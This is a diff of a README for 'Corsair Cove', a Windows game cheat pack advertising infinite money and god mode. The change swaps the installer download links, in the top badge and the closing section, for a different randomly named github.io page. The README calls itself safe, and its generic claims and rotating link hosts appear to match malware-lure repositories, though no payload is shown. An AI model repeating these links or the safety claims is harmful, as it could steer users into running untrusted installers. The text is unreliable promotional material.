@@ -2,7 +2,7 @@
 
 Corsair Cove is a versatile mod pack designed for Windows desktop users who want to enhance their gaming experience. Released in 2026, it includes a range of tools such as infinite money, god mode, and unlimited resources, all optimized for Windows 10 and 11. Whether you're looking to bypass challenges or simply enjoy the game without limits, Corsair Cove provides a safe and easy solution.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -65,6 +65,6 @@ A: Check the logs in the installation directory or contact our support team via 
 
 To get the latest version of Corsair Cove, visit the download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 Thank you for choosing Corsair Cove. Last Updated: 2026.
